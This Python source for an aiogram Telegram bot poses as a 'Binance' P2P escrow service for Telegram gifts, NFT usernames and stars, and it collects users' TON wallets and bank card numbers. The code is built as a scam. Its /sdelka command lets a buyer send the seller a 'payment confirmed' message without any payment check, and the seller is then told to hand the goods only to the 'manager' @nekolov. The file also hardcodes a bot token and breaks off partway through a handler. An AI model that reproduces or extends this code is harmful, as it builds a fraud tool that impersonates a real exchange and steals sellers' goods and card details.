import asyncio
import logging
import random
import string
import sqlite3
import aiogram
from pathlib import Path

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
    Message, FSInputFile
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "7854878948:AAFty1yjJYc7GEPbA_kt9jcG8EBG7v1KjPw"
MANAGER = "@nekolov"
IMAGES_DIR = Path("images")

# ─── Database ────────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect("bot.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id       INTEGER PRIMARY KEY,
            username      TEXT,
            language      TEXT DEFAULT NULL,
            ton_wallet    TEXT,
            card          TEXT,
            stars_username TEXT DEFAULT NULL,
            ref_by        INTEGER,
            is_admin      INTEGER DEFAULT 0,
            created_at    TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS deals (
            deal_id     TEXT PRIMARY KEY,
            seller_id   INTEGER,
            buyer_id    INTEGER,
            deal_type   TEXT,
            pay_method  TEXT,
            amount      REAL,
            currency    TEXT,
            description TEXT,
            status      TEXT DEFAULT 'open',
            created_at  TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS referrals (
            ref_id    INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter   INTEGER,
            invited   INTEGER,
            earned    REAL DEFAULT 0
        );
        """)

def get_user(user_id: int):
    with get_db() as db:
        return db.execute(
            "SELECT user_id, username, language, ton_wallet, card, stars_username, ref_by, is_admin, created_at FROM users WHERE user_id=?",
            (user_id,)
        ).fetchone()

def ensure_user(user_id: int, username: str = None):
    with get_db() as db:
        db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?,?)",
            (user_id, username or "")
        )

def set_language(user_id: int, lang: str):
    with get_db() as db:
        db.execute("UPDATE users SET language=? WHERE user_id=?", (lang, user_id))

def set_requisite(user_id: int, field: str, value: str):
    allowed_fields = ["ton_wallet", "card", "stars_username"]
    if field not in allowed_fields:
        return
    with get_db() as db:
        db.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))

def gen_deal_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def create_deal(seller_id, deal_type, pay_method, amount, currency, description):
    deal_id = gen_deal_id()
    with get_db() as db:
        db.execute(
            "INSERT INTO deals (deal_id,seller_id,deal_type,pay_method,amount,currency,description) VALUES (?,?,?,?,?,?,?)",
            (deal_id, seller_id, deal_type, pay_method, amount, currency, description)
        )
    return deal_id

def get_deal(deal_id: str):
    with get_db() as db:
        return db.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,)).fetchone()

def update_deal(deal_id: str, **kwargs):
    fields = ", ".join(f"{k}=?" for k in kwargs)
    values = list(kwargs.values()) + [deal_id]
    with get_db() as db:
        db.execute(f"UPDATE deals SET {fields} WHERE deal_id=?", values)

def get_referrals_count(user_id: int):
    with get_db() as db:
        row = db.execute("SELECT COUNT(*) as cnt FROM referrals WHERE inviter=?", (user_id,)).fetchone()
        return row["cnt"] if row else 0

def get_referrals_earned(user_id: int):
    with get_db() as db:
        row = db.execute("SELECT SUM(earned) as total FROM referrals WHERE inviter=?", (user_id,)).fetchone()
        return row["total"] or 0.0


def get_user_stats(user_id: int):
    with get_db() as db:
        seller_deals = db.execute(
            "SELECT status, COUNT(*) as cnt FROM deals WHERE seller_id=? GROUP BY status",
            (user_id,)
        ).fetchall()
        buyer_deals = db.execute(
            "SELECT status, COUNT(*) as cnt FROM deals WHERE buyer_id=? GROUP BY status",
            (user_id,)
        ).fetchall()

    seller_stats = {row["status"]: row["cnt"] for row in seller_deals}
    buyer_stats = {row["status"]: row["cnt"] for row in buyer_deals}

    return {
        "sales_open": seller_stats.get('open', 0),
        "sales_active": seller_stats.get('active', 0),
        "sales_paid": seller_stats.get('paid', 0),
        "sales_completed": seller_stats.get('transferred', 0),
        "buys_active": buyer_stats.get('active', 0),
        "buys_confirmed": buyer_stats.get('paid', 0),
        "buys_received": buyer_stats.get('transferred', 0),
    }

# ─── Translations ─────────────────────────────────────────────────────────────

T = {
    "ru": {
        "welcome": (
            "🎉 Добро пожаловать в Binance – надежный P2P-гарант💼\n\n"
            "Покупайте и продавайте всё, что угодно – безопасно!\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "🔹 Удобное управление кошельками\n"
            "🔹 Реферальная система\n"
            "🔹 Безопасные сделки с гарантией\n\n"
            "Выберите нужный раздел ниже:"
        ),
        "menu_buttons": ["📩 Управление реквизитами", "📝 Создать сделку", "🔗 Реферальная ссылка", "🌍 Изменить язык", "📞 Поддержка"],
        "choose_req": "⚙️ Выберите реквизит для управления:",
        "ton_wallet": "💎 TON-кошелёк",
        "card": "💳 Банковская карта",
        "enter_ton": "💎 Введите ваш TON-кошелёк:",
        "enter_card": "💳 Введите номер карты и имя носителя:",
        "saved": "✅ Сохранено!",
        "back_menu": "🔙 Вернуться в меню",
        "choose_deal_type": "📝 Выберите тип сделки:",
        "deal_types": ["🎁 Подарок", "📢 Канал/чат", "⭐️ Звезды", "🆔 НФТ Юзернейм"],
        "choose_pay_method": "💳 Выберите метод получения оплаты:",
        "pay_methods": ["💎 На TON-кошелек", "💳 На карту", "⭐️ Звезды"],
        "no_ton": "❌ У вас не добавлен TON кошелек!\n\nСначала добавьте кошелёк в разделе '📩 Управление реквизитами'",
        "no_card": "❌ У вас не добавлена банковская карта!\n\nСначала добавьте карту в разделе '📩 Управление реквизитами'",
        "enter_amount_rub": "💰 Введите сумму сделки (в рублях):",
        "enter_amount_ton": "💰 Введите сумму сделки (в TON):",
        "enter_amount_stars": "💰 Введите сумму сделки (в звёздах):",
        "enter_desc": "📝 Опишите товар/услугу для сделки:",
        "desc_short": "❌ Описание слишком короткое! Напишите минимум 5 символов:",
        "choose_lang": "🌍 Выберите язык / Choose language:",
        "lang_saved": "✅ Язык изменён!",
        "confirm_transfer": "✅ Подтвердить передачу",
        "payment_confirmed_btn": "✅ Оплата подтверждена",
        "stars_username": "⭐️ Юзернейм для звёзд",
        "enter_stars_username": "⭐️ Введите ваш юзернейм (без @) для получения звёзд:",
    },
    "en": {
        "welcome": (
            "🎉 Welcome to Binance – trusted P2P escrow💼\n\n"
            "Buy and sell anything – safely!\n"
            "From Telegram gifts and NFTs to tokens and fiat – deals are easy and risk-free.\n\n"
            "🔹 Convenient wallet management\n"
            "🔹 Referral system\n"
            "🔹 Secure guaranteed deals\n\n"
            "Choose a section below:"
        ),
        "menu_buttons": ["📩 Manage Requisites", "📝 Create Deal", "🔗 Referral Link", "🌍 Change Language", "📞 Support"],
        "choose_req": "⚙️ Choose a requisite to manage:",
        "ton_wallet": "💎 TON Wallet",
        "card": "💳 Bank Card",
        "enter_ton": "💎 Enter your TON wallet address:",
        "enter_card": "💳 Enter the card number and cardholder name:",
        "saved": "✅ Saved!",
        "back_menu": "🔙 Back to menu",
        "choose_deal_type": "📝 Choose deal type:",
        "deal_types": ["🎁 Gift", "📢 Channel/Chat", "⭐️ Stars", "🆔 NFT Username"],
        "choose_pay_method": "💳 Choose payment method:",
        "pay_methods": ["💎 TON Wallet", "💳 Card", "⭐️ Stars"],
        "no_ton": "❌ You don't have a TON wallet added!\n\nFirst add a wallet in the '📩 Manage Requisites' section",
        "no_card": "❌ You don't have a bank card added!\n\nFirst add a card in the '📩 Manage Requisites' section",
        "enter_amount_rub": "💰 Enter the deal amount (in rubles):",
        "enter_amount_ton": "💰 Enter the deal amount (in TON):",
        "enter_amount_stars": "💰 Enter the deal amount (in stars):",
        "enter_desc": "📝 Describe the product/service for the deal:",
        "desc_short": "❌ Description too short! Write at least 5 characters:",
        "choose_lang": "🌍 Выберите язык / Choose language:",
        "lang_saved": "✅ Language changed!",
        "confirm_transfer": "✅ Confirm Transfer",
        "payment_confirmed_btn": "✅ Payment Confirmed",
        "stars_username": "⭐️ Username for Stars",
        "enter_stars_username": "⭐️ Enter your username (without @) to receive Stars:",
    }
}

def t(user_id: int, key: str) -> str:
    user = get_user(user_id)
    lang = user["language"] if user and user["language"] else "ru"
    return T[lang].get(key, T["ru"].get(key, key))

def get_lang(user_id: int) -> str:
    user = get_user(user_id)
    return user["language"] if user and user["language"] else "ru"

# ─── Label maps ───────────────────────────────────────────────────────────────

DEAL_TYPE_LABELS = {
    "gift":    {"ru": "🎁 Подарок",         "en": "🎁 Gift"},
    "channel": {"ru": "📢 Канал/чат",       "en": "📢 Channel/Chat"},
    "stars":   {"ru": "⭐️ Звезды",          "en": "⭐️ Stars"},
    "nft":     {"ru": "🆔 НФТ Юзернейм",    "en": "🆔 NFT Username"},
}
PAY_METHOD_LABELS = {
    "ton":   {"ru": "💎 TON-кошелёк", "en": "💎 TON Wallet"},
    "card":  {"ru": "💳 Карта",       "en": "💳 Card"},
    "stars": {"ru": "⭐️ Звезды",      "en": "⭐️ Stars"},
}
CURRENCY_LABELS = {"ton": "TON", "card": "₽", "stars": "⭐️"}

def dlabel(deal_type: str, lang: str) -> str:
    return DEAL_TYPE_LABELS.get(deal_type, {}).get(lang, deal_type)

def plabel(pay_method: str, lang: str) -> str:
    return PAY_METHOD_LABELS.get(pay_method, {}).get(lang, pay_method)

def cur(pay_method: str) -> str:
    return CURRENCY_LABELS.get(pay_method, "")

# ─── Keyboards ────────────────────────────────────────────────────────────────

def kb_lang():
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en"),
    ]])

def kb_back(uid: int):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t(uid, "back_menu"), callback_data="back_menu")
    ]])


def kb_menu(uid: int):
    lang = get_lang(uid)
    btns = T[lang]["menu_buttons"]
    profile_btn = "👤 Profile" if lang == "en" else "👤 Профиль"

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=profile_btn, callback_data="menu_profile")],
        [InlineKeyboardButton(text=btns[0], callback_data="menu_req")],
        [InlineKeyboardButton(text=btns[1], callback_data="menu_deal")],
        [InlineKeyboardButton(text=btns[2], callback_data="menu_ref")],
        [InlineKeyboardButton(text=btns[3], callback_data="menu_lang")],
        [InlineKeyboardButton(text=btns[4], callback_data="menu_support")],
    ])

def kb_req(uid: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(uid, "ton_wallet"), callback_data="req_ton")],
        [InlineKeyboardButton(text=t(uid, "card"), callback_data="req_card")],
        [InlineKeyboardButton(text=t(uid, "stars_username"), callback_data="req_stars")],
        [InlineKeyboardButton(text=t(uid, "back_menu"), callback_data="back_menu")],
    ])

def kb_deal_types(uid: int):
    types = T[get_lang(uid)]["deal_types"]
    keys  = ["gift","channel","stars","nft"]
    rows  = [[InlineKeyboardButton(text=types[i], callback_data=f"dtype_{keys[i]}")] for i in range(4)]
    rows.append([InlineKeyboardButton(text=t(uid,"back_menu"), callback_data="back_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_pay_methods(uid: int):
    methods = T[get_lang(uid)]["pay_methods"]
    keys    = ["ton","card","stars"]
    rows    = [[InlineKeyboardButton(text=methods[i], callback_data=f"pmethod_{keys[i]}")] for i in range(3)]
    rows.append([InlineKeyboardButton(text=t(uid,"back_menu"), callback_data="back_menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_join(uid: int, deal_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤝 Присоединиться к сделке" if get_lang(uid)=="ru" else "🤝 Join the deal",
                              callback_data=f"join_{deal_id}")],
        [InlineKeyboardButton(text=t(uid,"back_menu"), callback_data="back_menu")],
    ])

def kb_payment_confirmed(uid: int, deal_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t(uid,"payment_confirmed_btn"), callback_data=f"paydone_{deal_id}")
    ]])

def kb_confirm_transfer(uid: int, deal_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t(uid,"confirm_transfer"), callback_data=f"transdone_{deal_id}")
    ]])

# ─── FSM ──────────────────────────────────────────────────────────────────────

class DealFSM(StatesGroup):
    waiting_amount = State()
    waiting_desc   = State()

class ReqFSM(StatesGroup):
    waiting_ton  = State()
    waiting_card = State()
    waiting_stars = State()

# ─── Router ──────────────────────────────────────────────────────────────────

router = Router()


async def send_menu(bot: Bot, uid: int, chat_id: int = None):
    chat_id = chat_id or uid
    photo_path = IMAGES_DIR / "zastavka.jpg"

    if photo_path.exists():
        photo = FSInputFile(photo_path)
        await bot.send_photo(
            chat_id=chat_id,
            photo=photo,
            caption=t(uid, "welcome"),
            reply_markup=kb_menu(uid)
        )
    else:
        await bot.send_message(
            chat_id=chat_id,
            text=t(uid, "welcome"),
            reply_markup=kb_menu(uid)
        )

@router.message(CommandStart())
async def cmd_start(message: Message, bot: Bot):
    uid  = message.from_user.id
    uname = message.from_user.username or ""
    ensure_user(uid, uname)

    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith("deal_"):
            await show_deal_for_buyer(message, bot, param[5:])
            return
        if param.startswith("ref_"):
            ref_by = int(param[4:])
            if ref_by != uid:
                with get_db() as db:
                    if not db.execute("SELECT 1 FROM referrals WHERE invited=?", (uid,)).fetchone():
                        db.execute("INSERT INTO referrals (inviter,invited) VALUES (?,?)", (ref_by, uid))

    user = get_user(uid)
    if not user["language"]:
        await message.answer(t(uid,"choose_lang"), reply_markup=kb_lang())
    else:
        await send_menu(bot, uid)

async def show_deal_for_buyer(message: Message, bot: Bot, deal_id: str):
    uid   = message.from_user.id
    deal  = get_deal(deal_id)
    lang  = get_lang(uid)
    if not deal:
        await message.answer("❌ Сделка не найдена." if lang=="ru" else "❌ Deal not found.")
        return
    if deal["seller_id"] == uid:
        await message.answer("❌ Это ваша сделка." if lang=="ru" else "❌ This is your own deal.")
        return
    if deal["status"] != "open":
        await message.answer("❌ Сделка уже занята." if lang=="ru" else "❌ This deal is already taken.")
        return

    amount_str = f"{deal['amount']} {cur(deal['pay_method'])}"
    dtype  = dlabel(deal["deal_type"],  lang)
    pmethod = plabel(deal["pay_method"], lang)

    if lang == "ru":
        text = (
            f"🎯 Найдена сделка для вас!\n\n"
            f"🆔 Номер сделки: <code>{deal['deal_id']}</code>\n"
            f"📝 Тип: {dtype}\n"
            f"💰 Сумма: {amount_str}\n"
            f"📄 Описание:\n<blockquote>{deal['description']}</blockquote>\n"
            f"💳 Метод оплаты: {pmethod}\n\n"
            f"Хотите присоединиться к этой сделке?"
        )
    else:
        text = (
            f"🎯 Deal found for you!\n\n"
            f"🆔 Deal number: <code>{deal['deal_id']}</code>\n"
            f"📝 Type: {dtype}\n"
            f"💰 Amount: {amount_str}\n"
            f"📄 Description:\n<blockquote>{deal['description']}</blockquote>\n"
            f"💳 Payment method: {pmethod}\n\n"
            f"Do you want to join this deal?"
        )
    await message.answer(text, reply_markup=kb_join(uid, deal["deal_id"]), parse_mode="HTML")

# ── Language ──────────────────────────────────────────────────────────────────
# ─── Menu language button ─────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_lang")
async def menu_lang_handler(call: CallbackQuery):
    uid = call.from_user.id

    try:
        await call.message.delete()
    except Exception:
        pass

    await call.message.answer(
        text=t(uid, "choose_lang"),
        reply_markup=kb_lang()
    )
    await call.answer()


@router.callback_query(F.data.in_(["lang_ru", "lang_en"]))
async def cb_lang(call: CallbackQuery, bot: Bot):
    uid = call.from_user.id
    lang = "ru" if call.data == "lang_ru" else "en"
    ensure_user(uid, call.from_user.username or "")
    set_language(uid, lang)

    try:
        await call.message.delete()
    except Exception:
        pass

    await send_menu(bot, uid, call.message.chat.id)
    await call.answer()
# ── Back / Menu ───────────────────────────────────────────────────────────────

@router.callback_query(F.data == "back_menu")
async def cb_back(call: CallbackQuery, bot: Bot, state: FSMContext):
    await state.clear()
    try:
        await call.message.delete()
    except Exception:
        pass
    await send_menu(bot, call.from_user.id)
    await call.answer()

# ── Support ───────────────────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_support")
async def cb_support(call: CallbackQuery):
    uid = call.from_user.id
    txt = f"📞 Поддержка: {MANAGER}" if get_lang(uid)=="ru" else f"📞 Support: {MANAGER}"
    await call.answer(txt, show_alert=True)

# ── Referral ──────────────────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_ref")
async def cb_ref(call: CallbackQuery, bot: Bot):
    uid   = call.from_user.id
    me    = await bot.get_me()
    link  = f"https://t.me/{me.username}?start=ref_{uid}"
    count = get_referrals_count(uid)
    earned = get_referrals_earned(uid)
    lang  = get_lang(uid)
    if lang == "ru":
        text = (
            f"🔗 Ваша реферальная ссылка:\n{link}\n\n"
            f"👥 Количество рефералов: {count}\n"
            f"💰 Заработано с рефералов: {earned:.1f} TON\n\n"
            f"40% от комиссии бота"
        )
    else:
        text = (
            f"🔗 Your referral link:\n{link}\n\n"
            f"👥 Referral count: {count}\n"
            f"💰 Earned from referrals: {earned:.1f} TON\n\n"
            f"40% of bot commission"
        )
    await call.message.delete()
    await call.message.answer(text, reply_markup=kb_back(uid), parse_mode="HTML")
    await call.answer()

# ── Requisites ────────────────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_req")
async def cb_req(call: CallbackQuery):
    uid = call.from_user.id
    await call.message.delete()
    await call.message.answer(t(uid,"choose_req"), reply_markup=kb_req(uid))
    await call.answer()

@router.callback_query(F.data == "req_ton")
async def cb_req_ton(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await call.message.delete()
    await call.message.answer(t(uid,"enter_ton"), reply_markup=kb_back(uid))
    await state.set_state(ReqFSM.waiting_ton)
    await call.answer()

@router.callback_query(F.data == "req_card")
async def cb_req_card(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await call.message.delete()
    await call.message.answer(t(uid,"enter_card"), reply_markup=kb_back(uid))
    await state.set_state(ReqFSM.waiting_card)
    await call.answer()

@router.callback_query(F.data == "req_stars")
async def cb_req_stars(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    await call.message.delete()
    await call.message.answer(t(uid, "enter_stars_username"), reply_markup=kb_back(uid))
    await state.set_state(ReqFSM.waiting_stars)
    await call.answer()

@router.message(ReqFSM.waiting_stars)
async def fsm_save_stars(message: Message, state: FSMContext):
    uid = message.from_user.id
    username = message.text.strip().replace("@", "")  # Убираем @ если ввели
    set_requisite(uid, "stars_username", username)
    await state.clear()
    await message.answer(t(uid, "saved"), reply_markup=kb_back(uid))

@router.message(ReqFSM.waiting_ton)
async def fsm_save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id
    set_requisite(uid, "ton_wallet", message.text.strip())
    await state.clear()
    await message.answer(t(uid,"saved"), reply_markup=kb_back(uid))

@router.message(ReqFSM.waiting_card)
async def fsm_save_card(message: Message, state: FSMContext):
    uid = message.from_user.id
    set_requisite(uid, "card", message.text.strip())
    await state.clear()
    await message.answer(t(uid,"saved"), reply_markup=kb_back(uid))

# ── Deal creation ──────────────────────────────────────────────────────────────

@router.callback_query(F.data == "menu_deal")
async def cb_menu_deal(call: CallbackQuery):
    uid = call.from_user.id
    await call.message.delete()
    await call.message.answer(t(uid,"choose_deal_type"), reply_markup=kb_deal_types(uid))
    await call.answer()

@router.callback_query(F.data.startswith("dtype_"))
async def cb_dtype(call: CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    dtype = call.data[6:]
    await state.update_data(deal_type=dtype)
    await call.message.delete()
    await call.message.answer(t(uid,"choose_pay_method"), reply_markup=kb_pay_methods(uid))
    await call.answer()

@router.callback_query(F.data.startswith("pmethod_"))
async def cb_pmethod(call: CallbackQuery, state: FSMContext):
    uid     = call.from_user.id
    pmethod = call.data[8:]
    user    = get_user(uid)

    if pmethod == "ton" and not user["ton_wallet"]:
        await call.message.delete()
        await call.message.answer(t(uid,"no_ton"), reply_markup=kb_back(uid))
        await call.answer(); return
    if pmethod == "card" and not user["card"]:
        await call.message.delete()
        await call.message.answer(t(uid,"no_card"), reply_markup=kb_back(uid))
        await call.answer(); return

    await state.update_data(pay_method=pmethod)
    prompt_key = {"ton":"enter_amount_ton","card":"enter_amount_rub","stars":"enter_amount_stars"}[pmethod]
    await call.message.delete()
    await call.message.answer(t(uid, prompt_key), reply_markup=kb_back(uid))
    await state.set_state(DealFSM.waiting_amount)
    await call.answer()

@router.message(DealFSM.waiting_amount)
async def fsm_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    try:
        amount = float(message.text.strip().replace(",","."))
    except ValueError:
        err = "❌ Введите корректное число!" if get_lang(uid)=="ru" else "❌ Enter a valid number!"
        await message.answer(err, reply_markup=kb_back(uid)); return
    await state.update_data(amount=amount)
    await message.answer(t(uid,"enter_desc"), reply_markup=kb_back(uid))
    await state.set_state(DealFSM.waiting_desc)

@router.message(DealFSM.waiting_desc)
async def fsm_desc(message: Message, state: FSMContext, bot: Bot):
    uid  = message.from_user.id
    desc = message.text.strip()
    if len(desc) < 5:
        await message.answer(t(uid,"desc_short"), reply_markup=kb_back(uid)); return

    data   = await state.get_data()
    dtype  = data["deal_type"]
    pm     = data["pay_method"]
    amount = data["amount"]
    currency = cur(pm)

    deal_id = create_deal(uid, dtype, pm, amount, currency, desc)
    await state.clear()

    me   = await bot.get_me()
    link = f"https://t.me/{me.username}?start=deal_{deal_id}"
    lang = get_lang(uid)
    amount_str = f"{amount} {currency}"

    if lang == "ru":
        text = (
            f"✅ Сделка успешно создана!\n\n"
            f"🆔 Номер сделки: <code>{deal_id}</code>\n"
            f"📝 Тип: {dlabel(dtype,lang)}\n"
            f"💰 Сумма: {amount_str}\n"
            f"📄 Описание:\n<blockquote>{desc}</blockquote>\n"
            f"💳 Метод оплаты: {plabel(pm,lang)}\n\n"
            f"🔗 Уникальная ссылка для этой сделки:\n{link}\n\n"
            f"📢 Эта ссылка ведёт непосредственно к вашей сделке!\n"
            f"Отправьте её потенциальному покупателю."
        )
    else:
        text = (
            f"✅ Deal successfully created!\n\n"
            f"🆔 Deal number: <code>{deal_id}</code>\n"
            f"📝 Type: {dlabel(dtype,lang)}\n"
            f"💰 Amount: {amount_str}\n"
            f"📄 Description:\n<blockquote>{desc}</blockquote>\n"
            f"💳 Payment method: {plabel(pm,lang)}\n\n"
            f"🔗 Unique link for this deal:\n{link}\n\n"
            f"📢 This link leads directly to your deal!\n"
            f"Send it to a potential buyer."
        )
    await message.answer(text, reply_markup=kb_back(uid), parse_mode="HTML")

# ── Join deal ─────────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("join_"))
async def cb_join(call: CallbackQuery, bot: Bot):
    uid = call.from_user.id
    deal_id = call.data[5:]
    deal = get_deal(deal_id)

    if not deal or deal["status"] != "open":
        await call.answer("❌ Сделка недоступна.", show_alert=True)
        return
    if deal["seller_id"] == uid:
        await call.answer("❌ Это ваша сделка.", show_alert=True)
        return

    update_deal(deal_id, buyer_id=uid, status="active")
    deal = get_deal(deal_id)

    lang_b = get_lang(uid)
    lang_s = get_lang(deal["seller_id"])
    amount_str = f"{deal['amount']} {cur(deal['pay_method'])}"
    buyer_uname = f"@{call.from_user.username}" if call.from_user.username else f"id{uid}"

    # --- Сообщение покупателю (БЕЗ КНОПКИ) ---
    if lang_b == "ru":
        buyer_text = (
            f"✅ Вы успешно присоединились к сделке!\n\n"
            f"🆔 Номер сделки: <code>{deal_id}</code>\n"
            f"📝 Тип: {dlabel(deal['deal_type'], lang_b)}\n"
            f"💰 Сумма к оплате: {amount_str}\n"
            f"📄 Товар: <blockquote>{deal['description']}</blockquote>\n\n"
            f"📱 Свяжитесь с продавцом и договоритесь об условиях оплаты.\n\n"
        )
    else:
        buyer_text = (
            f"✅ You have successfully joined the deal!\n\n"
            f"🆔 Deal number: <code>{deal_id}</code>\n"
            f"📝 Type: {dlabel(deal['deal_type'], lang_b)}\n"
            f"💰 Amount to pay: {amount_str}\n"
            f"📄 Item: <blockquote>{deal['description']}</blockquote>\n\n"
            f"📱 Contact the seller and agree on payment terms.\n\n"
        )
    await call.message.edit_text(buyer_text, parse_mode="HTML")  # БЕЗ КНОПКИ!

    # --- Сообщение продавцу ---
    if lang_s == "ru":
        seller_text = (
            f"🎉 К вашей сделке #{deal_id} присоединился покупатель!\n\n"
            f"👤 Покупатель: {buyer_uname}\n"
            f"💰 Сумма к получению: {amount_str}\n"
            f"📝 Товар: <blockquote>{deal['description']}</blockquote>\n\n"
            f"📝 Следующие шаги:\n"
            f"1. Дождитесь оплаты от покупателя\n"
            f"2. После получения оплаты передайте товар менеджеру\n\n"
            f"⚠️ Внимание: Вы обязуетесь предоставить товар после получения оплаты!"
        )
    else:
        seller_text = (
            f"🎉 A buyer has joined your deal #{deal_id}!\n\n"
            f"👤 Buyer: {buyer_uname}\n"
            f"💰 Amount to receive: {amount_str}\n"
            f"📝 Item: <blockquote>{deal['description']}</blockquote>\n\n"
            f"📝 Next steps:\n"
            f"1. Wait for payment from the buyer\n"
            f"2. After receiving payment, pass the item to the manager\n\n"
            f"⚠️ Warning: You agree to provide the item after receiving payment!"
        )
    await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML")

    await call.answer()

# ── /sdelka command ───────────────────────────────────────────────────────────

@router.message(Command("sdelka"))
async def cmd_sdelka(message: Message, bot: Bot):
    uid  = message.from_user.id
    lang = get_lang(uid)
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Укажите номер: /sdelka НОМЕР" if lang=="ru" else "❌ Specify number: /sdelka NUMBER")
        return

    deal_id = args[1].upper()
    deal = get_deal(deal_id)
    if not deal:
        await message.answer("❌ Сделка не найдена." if lang=="ru" else "❌ Deal not found.")
        return

    amount_str = f"{deal['amount']} {cur(deal['pay_method'])}"

    if uid == deal["seller_id"]:
        if not deal["buyer_id"]:
            await message.answer("❌ К вашей сделке ещё никто не присоединился." if lang=="ru" else "❌ No one has joined your deal yet.")
            return
        lang_b = get_lang(deal["buyer_id"])
        if lang_b == "ru":
            buyer_msg = (
                f"✅ Товар передан менеджеру для сделки #{deal_id}.\n\n"
                f"💰 Сумма: {amount_str}\n"
                f"📝 Описание: <blockquote>{deal['description']}</blockquote>\n\n"
                f"🎁 Товар находится у менеджера бота {MANAGER} ✅"
            )
        else:
            buyer_msg = (
                f"✅ Item passed to manager for deal #{deal_id}.\n\n"
                f"💰 Amount: {amount_str}\n"
                f"📝 Description: <blockquote>{deal['description']}</blockquote>\n\n"
                f"🎁 Item is with the bot manager {MANAGER} ✅"
            )
        await bot.send_message(deal["buyer_id"], buyer_msg, parse_mode="HTML")
        await message.answer("✅ Сообщение успешно отправлено покупателю!" if lang=="ru" else "✅ Message successfully sent to the buyer!")

    elif uid == deal["buyer_id"]:
        lang_s = get_lang(deal["seller_id"])
        dtype_s = dlabel(deal["deal_type"], lang_s)
        if lang_s == "ru":
            seller_msg = (
                f"✅ Оплата подтверждена для сделки #{deal_id}.\n\n"
                f"💰 Сумма: {amount_str}\n"
                f"📝 Описание: <blockquote>{deal['description']}</blockquote>\n\n"
                f"❗️ Пожалуйста, передайте {dtype_s}:\n"
                f"Только менеджеру бота для обработки: {MANAGER}\n\n"
                f"⚠️ Обратите внимание:\n"
                f"➤ Подарок необходимо передать именно менеджеру {MANAGER}, а не покупателю напрямую.\n"
                f"➤ Это стандартный процесс для автоматического завершения сделки через бота.\n\n"
                f"После отправки менеджеру подтвердите действие кнопкой ниже:"
            )
        else:
            seller_msg = (
                f"✅ Payment confirmed for deal #{deal_id}.\n\n"
                f"💰 Amount: {amount_str}\n"
                f"📝 Description: <blockquote>{deal['description']}</blockquote>\n\n"
                f"❗️ Please transfer {dtype_s}:\n"
                f"Only to the bot manager for processing: {MANAGER}\n\n"
                f"⚠️ Note:\n"
                f"➤ The item must be passed to manager {MANAGER}, not to the buyer directly.\n"
                f"➤ This is the standard process for automatic deal completion via the bot.\n\n"
                f"After sending to the manager, confirm the action with the button below:"
            )
        await bot.send_message(deal["seller_id"], seller_msg, parse_mode="HTML",
                               reply_markup=kb_confirm_transfer(deal["seller_id"], deal_id))
        await message.answer("✅ Уведомление отправлено продавцу!" if lang=="ru" else "✅ Notification sent to the seller!")
    else:
        await message.answer("❌ Вы не участник этой сделки." if lang=="ru" else "❌ You are not a participant in this deal.")

# ── Confirm transfer ──────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("transdone_"))
async def cb_transdone(call: CallbackQuery, bot: Bot):
    uid     = call.from_user.id
    deal_id = call.data[10:]
    deal    = get_deal(deal_id)
    if not deal: await call.answer("❌"); return

    lang = get_lang(uid)
    if lang == "ru":
        text = (
            f"✅ Передача товара подтверждена для сделки #{deal_id}\n\n"
            f"Товар находится у менеджера и будет передан покупателю после подтверждения оплаты."
        )
    else:
        text = (
            f"✅ Transfer confirmed for deal #{deal_id}\n\n"
            f"Item is with the manager and will be passed to the buyer after payment confirmation."
        )
    update_deal(deal_id, status="transferred")
    await call.message.edit_text(text, parse_mode="HTML")
    await call.answer()

# ── Payment confirmed ─────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("paydone_"))
async def cb_paydone(call: CallbackQuery, bot: Bot):
    uid     = call.from_user.id
    deal_id = call.data[8:]
    deal    = get_deal(deal_id)
    if not deal: await call.answer("❌"); return

    lang = get_lang(uid)
    if lang == "ru":
        text = (
